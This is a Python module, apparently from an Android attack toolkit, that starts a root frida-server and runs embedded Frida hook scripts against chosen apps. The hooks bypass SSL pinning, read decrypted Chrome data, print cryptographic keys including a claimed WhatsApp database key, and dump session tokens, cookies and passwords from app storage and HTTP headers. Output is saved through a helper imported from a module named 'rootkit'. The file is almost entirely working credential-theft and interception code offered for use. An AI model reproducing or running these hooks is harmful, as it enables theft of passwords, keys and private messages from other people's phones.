"""Frida-Runtime-Engine – dynamische Instrumentierung zur Laufzeit.

Der größte Hebel: holt, was offline verschlüsselt ist (Klartext-Passwörter,
Crypt-Keys, TLS-Schlüssel, Session-Tokens) und bricht SSL-Pinning.

Ablauf:
  1. ABI erkennen → passenden frida-server laden/pushen/starten (Root)
  2. Hook-Skript gegen Ziel-App ausführen (attach oder spawn)
  3. Ausgaben einsammeln & speichern

Benötigt: Root am Gerät + lokal installierte 'frida'-Tools (pip install frida-tools).
Alles echt – fehlt etwas, sagt das Tool genau, was zu tun ist.
"""
from __future__ import annotations

import lzma
import os
import shutil
import subprocess
import tempfile
import time
import urllib.request

from . import ui
from .adb import ADB
from .util import https_only, sha256_file

WORK = os.path.expanduser("~/Schreibtisch/Androidpanzer/frida")
SERVER_PATH = "/data/local/tmp/frida-server"

ARCH_MAP = {"arm64-v8a": "arm64", "armeabi-v7a": "arm", "x86_64": "x86_64", "x86": "x86"}


# --------------------------------------------------------------------- #
#  Hook-Skript-Bibliothek (echte, einsatzfähige Frida-Skripte)
# --------------------------------------------------------------------- #
SCRIPTS: dict[str, tuple[str, str]] = {
    "ssl-unpin": ("Universelles SSL-Pinning-Bypass (OkHttp/TrustManager/WebView)", r"""
Java.perform(function () {
  console.log("[*] SSL-Unpinning aktiv");
  // 1) Default TrustManager neutralisieren
  try {
    var X509TM = Java.use('javax.net.ssl.X509TrustManager');
    var SSLContext = Java.use('javax.net.ssl.SSLContext');
    var TM = Java.registerClass({
      name: 'com.panzer.TM',
      implements: [X509TM],
      methods: {
        checkClientTrusted: function (c, a) {},
        checkServerTrusted: function (c, a) {},
        getAcceptedIssuers: function () { return []; }
      }
    });
    var init = SSLContext.init.overload(
      '[Ljavax.net.ssl.KeyManager;', '[Ljavax.net.ssl.TrustManager;', 'java.security.SecureRandom');
    init.implementation = function (km, tm, sr) {
      console.log("[+] SSLContext.init gehookt – Trust überschrieben");
      init.call(this, km, [TM.$new()], sr);
    };
  } catch (e) { console.log("[-] TM: " + e); }
  // 2) OkHttp CertificatePinner
  try {
    var CP = Java.use('okhttp3.CertificatePinner');
    CP.check.overload('java.lang.String', 'java.util.List').implementation = function (h, p) {
      console.log("[+] OkHttp Pinning umgangen für " + h);
    };
  } catch (e) {}
  // 3) WebViewClient onReceivedSslError
  try {
    var WVC = Java.use('android.webkit.WebViewClient');
    WVC.onReceivedSslError.implementation = function (v, hand, err) { hand.proceed(); };
  } catch (e) {}
  console.log("[*] Bereit – Traffic ist jetzt abfangbar (mitmproxy).");
});
"""),

    "chrome-passwords": ("Chrome/Chromium: Passwort-Entschlüsselung zur Laufzeit abgreifen", r"""
Java.perform(function () {
  console.log("[*] Suche Chromium-Passwort-/Krypto-Aufrufe …");
  // Android Keystore Entschlüsselung (Cipher.doFinal) mitlesen
  try {
    var Cipher = Java.use('javax.crypto.Cipher');
    Cipher.doFinal.overload('[B').implementation = function (b) {
      var out = this.doFinal(b);
      try {
        var s = Java.use('java.lang.String').$new(out);
        if (s.length > 0 && s.length < 200) console.log("[Cipher.doFinal] " + s);
      } catch (e) {}
      return out;
    };
  } catch (e) { console.log("[-] " + e); }
});
"""),

    "keystore-dump": ("Android Keystore: alle entschlüsselten Daten (Cipher/Mac) mitlesen", r"""
Java.perform(function () {
  console.log("[*] Keystore-Krypto-Tap aktiv");
  var Cipher = Java.use('javax.crypto.Cipher');
  ['doFinal', 'update'].forEach(function (m) {
    try {
      Cipher[m].overload('[B').implementation = function (b) {
        var r = this[m](b);
        try { console.log("[Cipher." + m + "] in=" + b.length + " out=" + (r ? r.length : 0)); } catch (e) {}
        return r;
      };
    } catch (e) {}
  });
  // Schlüssel-Material beim Erzeugen
  try {
    var SKS = Java.use('javax.crypto.spec.SecretKeySpec');
    SKS.$init.overload('[B', 'java.lang.String').implementation = function (k, a) {
      console.log("[SecretKeySpec] alg=" + a + " key(hex)=" + bytesToHex(k));
      return this.$init(k, a);
    };
  } catch (e) {}
  function bytesToHex(b) { var h = ''; for (var i = 0; i < b.length; i++) { var v = (b[i] & 0xff).toString(16); h += (v.length == 1 ? '0' : '') + v; } return h; }
});
"""),

    "whatsapp-key": ("WhatsApp: Datenbank-/Backup-Schlüssel aus dem Speicher ziehen", r"""
Java.perform(function () {
  console.log("[*] WhatsApp Key-Hunter");
  try {
    var SKS = Java.use('javax.crypto.spec.SecretKeySpec');
    SKS.$init.overload('[B', 'java.lang.String').implementation = function (k, a) {
      if (k.length == 32) console.log("[WA möglicher DB-Key] " + bytesToHex(k));
      return this.$init(k, a);
    };
  } catch (e) {}
  function bytesToHex(b){var h='';for(var i=0;i<b.length;i++){var v=(b[i]&0xff).toString(16);h+=(v.length==1?'0':'')+v;}return h;}
});
"""),

    "crypto-intercept": ("Generischer Krypto-Interceptor (AES/RSA In-/Output + Keys)", r"""
Java.perform(function () {
  console.log("[*] Krypto-Interceptor aktiv (alle Cipher-Operationen)");
  var Cipher = Java.use('javax.crypto.Cipher');
  Cipher.getInstance.overload('java.lang.String').implementation = function (t) {
    console.log("[Cipher.getInstance] " + t);
    return this.getInstance(t);
  };
  Cipher.doFinal.overload('[B').implementation = function (b) {
    var r = this.doFinal(b);
    console.log("[doFinal] mode=" + this.getAlgorithm());
    return r;
  };
});
"""),

    "token-finder": ("Session-Token/Cookie-Finder (SharedPreferences + HTTP-Header)", r"""
Java.perform(function () {
  console.log("[*] Token-Finder aktiv");
  try {
    var SP = Java.use('android.app.SharedPreferencesImpl');
    SP.getString.implementation = function (k, d) {
      var v = this.getString(k, d);
      if (v && /token|auth|session|cookie|bearer|jwt|secret|password/i.test(k))
        console.log("[SharedPref] " + k + " = " + v);
      return v;
    };
  } catch (e) {}
  // OkHttp Request-Header
  try {
    var RB = Java.use('okhttp3.Request$Builder');
    RB.header.implementation = function (n, v) {
      if (/authorization|cookie|token/i.test(n)) console.log("[HTTP " + n + "] " + v);
      return this.header(n, v);
    };
  } catch (e) {}
});
"""),

    "list-classes": ("Geladene Klassen auflisten (Recon eines Targets)", r"""
Java.perform(function () {
  var n = 0;
  Java.enumerateLoadedClasses({
    onMatch: function (name) { if (n++ < 400) console.log(name); },
    onComplete: function () { console.log("[*] " + n + " Klassen geladen"); }
  });
});
"""),

    "dump-strings": ("Klartext bei String-Operationen mitlesen (Recon)", r"""
Java.perform(function () {
  var SB = Java.use('java.lang.StringBuilder');
  SB.toString.implementation = function () {
    var s = this.toString();
    if (s && s.length > 8 && /https?:|token|key|pass|@/i.test(s)) console.log("[str] " + s);
    return s;
  };
});
"""),
}


# --------------------------------------------------------------------- #
#  Tooling-Erkennung
# --------------------------------------------------------------------- #
def _frida_cli() -> str | None:
    return shutil.which("frida")


def _frida_version() -> str:
    cli = _frida_cli()
    if not cli:
        try:
            import frida  # type: ignore
            return frida.__version__
        except Exception:  # noqa: BLE001
            return ""
    try:
        return subprocess.run([cli, "--version"], capture_output=True, text=True, timeout=10).stdout.strip()
    except Exception:  # noqa: BLE001
        return ""


def _arch(adb: ADB) -> str:
    return ARCH_MAP.get(adb.getprop("ro.product.cpu.abi"), "arm64")


# --------------------------------------------------------------------- #
#  frida-server verwalten
# --------------------------------------------------------------------- #
def server_running(adb: ADB) -> bool:
    return bool(adb.shell("pgrep -f frida-server 2>/dev/null", root=True).strip())


def ensure_server(adb: ADB, st: dict) -> bool:
    if server_running(adb):
        return True
    have = adb.shell(f"ls {SERVER_PATH} 2>/dev/null", root=True).strip()
    if SERVER_PATH not in have:
        if not _download_and_push(adb):
            return False
    ui.info("Starte frida-server (Root) …")
    adb.shell(f"chmod 755 {SERVER_PATH}; nohup {SERVER_PATH} >/dev/null 2>&1 &", root=True)
    time.sleep(2.5)
    if server_running(adb):
        ui.ok("frida-server läuft.")
        return True
    ui.err("frida-server konnte nicht gestartet werden.")
    return False


def _download_and_push(adb: ADB) -> bool:
    ver = _frida_version()
    if not ver:
        ui.err("Lokale Frida-Tools fehlen.  Installieren:  pip install frida-tools")
        return False
    arch = _arch(adb)
    fn = f"frida-server-{ver}-android-{arch}.xz"
    url = f"https://github.com/frida/frida/releases/download/{ver}/{fn}"
    os.makedirs(WORK, exist_ok=True)
    xz = os.path.join(WORK, fn)
    binp = xz[:-3]
    if not os.path.exists(binp):
        ui.info(f"Lade {fn} …")
        try:
            https_only(url)                 # frida-server läuft als ROOT → nur HTTPS
            urllib.request.urlretrieve(url, xz)  # noqa: S310 (https erzwungen)
            with lzma.open(xz) as f, open(binp, "wb") as o:
                o.write(f.read())
            ui.ok(f"frida-server entpackt · SHA-256: {sha256_file(binp)}")
        except Exception as e:  # noqa: BLE001
            ui.err(f"Download fehlgeschlagen: {e}")
            ui.info(f"Manuell laden: {url}  → entpacken → {binp}")
            return False
    ui.info("Pushe frida-server aufs Gerät …")
    tmp = "/sdcard/frida-server"
    adb.raw(["push", binp, tmp], timeout=120)
    adb.shell(f"cp {tmp} {SERVER_PATH}; chmod 755 {SERVER_PATH}; rm {tmp}", root=True)
    return bool(adb.shell(f"ls {SERVER_PATH}", root=True).strip())


# --------------------------------------------------------------------- #
#  Skript ausführen
# --------------------------------------------------------------------- #
def run_script(adb: ADB, pkg: str, js: str, seconds: int = 18, spawn: bool = False) -> str:
    cli = _frida_cli()
    if not cli:
        ui.err("frida-CLI fehlt (pip install frida-tools).")
        return ""
    with tempfile.NamedTemporaryFile("w", suffix=".js", delete=False, encoding="utf-8") as f:
        f.write(js)
        script_path = f.name
    cmd = [cli, "-U"]
    if spawn:
        cmd += ["-f", pkg, "--no-pause"]
    else:
        cmd += ["-n", pkg]
    cmd += ["-l", script_path, "-q"]
    ui.info(f"Frida {'spawnt' if spawn else 'attached an'} {pkg} … (sammle {seconds}s; interagiere ggf. am Gerät)")
    out_lines: list[str] = []
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        start = time.time()
        while time.time() - start < seconds:
            line = proc.stdout.readline() if proc.stdout else ""
            if line:
                print("   " + line.rstrip())
                out_lines.append(line.rstrip())
            elif proc.poll() is not None:
                break
        proc.terminate()
        try:
            proc.wait(timeout=3)
        except subprocess.TimeoutExpired:
            proc.kill()
    except KeyboardInterrupt:
        try:
            proc.terminate()
        except Exception:  # noqa: BLE001
            pass
    finally:
        os.unlink(script_path)
    return "\n".join(out_lines)


# --------------------------------------------------------------------- #
#  Menü
# --------------------------------------------------------------------- #
def menu(adb: ADB, dev, st) -> None:
    while True:
        ui.clear()
        ui.banner(subtitle="🧬 Frida-Runtime-Engine")
        ver = _frida_version()
        ui.kv("Frida-Tools (PC)", f"{ui.BGREEN}v{ver}{ui.RESET}" if ver else f"{ui.BRED}fehlt → pip install frida-tools{ui.RESET}")
        ui.kv("frida-server (Gerät)", f"{ui.BGREEN}läuft{ui.RESET}" if server_running(adb)
              else f"{ui.GREY}gestoppt{ui.RESET}")
        ui.kv("Root", "ja" if st.get("is_root") else f"{ui.BRED}nötig{ui.RESET}")
        if not st.get("is_root"):
            ui.err("Frida-Server-Start benötigt Root.")
            ui.pause(); return
        from . import frida_scripts
        entries = [("S", "frida-server sicherstellen/starten"),
                   ("B", f"{ui.BCYAN}📚 Hook-Bibliothek ({frida_scripts.count()} echte Skripte){ui.RESET}")]
        for i, (key, (desc, _js)) in enumerate(SCRIPTS.items(), 1):
            entries.append((str(i), desc))
        entries.append(("E", "Eigenes .js-Skript laden"))
        ch = ui.menu("Hooks", entries, back_label="Zurück")
        if ch in ("back", "quit"):
            return
        if ch == "s":
            ensure_server(adb, st); ui.pause(); continue
        if ch == "b":
            _hook_library(adb, st); continue
        if ch == "e":
            _run_custom(adb, st); continue
        # nummerierte Skripte
        try:
            idx = int(ch) - 1
            key = list(SCRIPTS.keys())[idx]
        except (ValueError, IndexError):
            ui.warn("Ungültig."); time.sleep(0.5); continue
        _run_named(adb, st, key)


def _run_named(adb: ADB, st: dict, key: str) -> None:
    ui.clear()
    desc, js = SCRIPTS[key]
    ui.rule(desc, ui.CYAN)
    if not ensure_server(adb, st):
        ui.pause(); return
    pkg = ui.ask("Ziel-Paket (z.B. com.android.chrome)")
    if not pkg:
        return
    spawn = ui.confirm("App neu starten (spawn statt attach)?", False)
    secs = ui.ask("Sammeldauer in Sekunden", "18")
    out = run_script(adb, pkg, js, seconds=int(secs) if secs.isdigit() else 18, spawn=spawn)
    if out.strip():
        from .rootkit import _save
        p = _save(f"frida_{key}_{pkg}.txt", out)
        ui.ok(f"Ausgabe gespeichert: {p}")
    else:
        ui.warn("Keine Treffer (App ggf. nicht aktiv / Hook traf nicht zu).")
    ui.pause()


def _hook_library(adb: ADB, st: dict) -> None:
    """Kategorisierte Bibliothek echter Frida-Hooks."""
    from . import frida_scripts
    cats = list(frida_scripts.LIB.items())
    while True:
        ui.clear()
        ui.banner(subtitle=f"📚 Frida-Hook-Bibliothek · {frida_scripts.count()} Skripte")
        for i, (cat, scripts) in enumerate(cats, 1):
            print(f"  {ui.CYAN}{i:>2}{ui.RESET}  {cat}  {ui.GREY}({len(scripts)}){ui.RESET}")
        sel = ui.ask("Kategorie-Nr (0=zurück)")
        if sel in ("0", "", "q", "back"):
            return
        try:
            cat, scripts = cats[int(sel) - 1]
        except (ValueError, IndexError):
            continue
        items = list(scripts.items())
        while True:
            ui.clear(); ui.rule(cat, ui.CYAN)
            for i, (name, _js) in enumerate(items, 1):
                print(f"  {ui.CYAN}{i:>2}{ui.RESET}  {name}")
            s2 = ui.ask("Skript-Nr (0=zurück)")
            if s2 in ("0", "", "back"):
                break
            try:
                name, js = items[int(s2) - 1]
            except (ValueError, IndexError):
                continue
            if not ensure_server(adb, st):
                ui.pause(); break
            pkg = ui.ask("Ziel-Paket (z.B. com.android.chrome)")
            if not pkg:
                continue
            spawn = ui.confirm("App neu starten (spawn)?", False)
            secs = ui.ask("Sammeldauer (s)", "20")
            out = run_script(adb, pkg, js, seconds=int(secs) if secs.isdigit() else 20, spawn=spawn)
            if out.strip():
                from .rootkit import _save
                _save(f"frida_lib_{pkg}.txt", out)
            ui.pause()


def _run_custom(adb: ADB, st: dict) -> None:
    path = ui.ask("Pfad zum .js-Skript")
    if not path or not os.path.isfile(os.path.expanduser(path)):
        ui.err("Datei nicht gefunden."); ui.pause(); return
    js = open(os.path.expanduser(path), encoding="utf-8").read()
    if not ensure_server(adb, st):
        ui.pause(); return
    pkg = ui.ask("Ziel-Paket")
    if pkg:
        run_script(adb, pkg, js, seconds=20, spawn=ui.confirm("Spawn?", False))
        ui.pause()
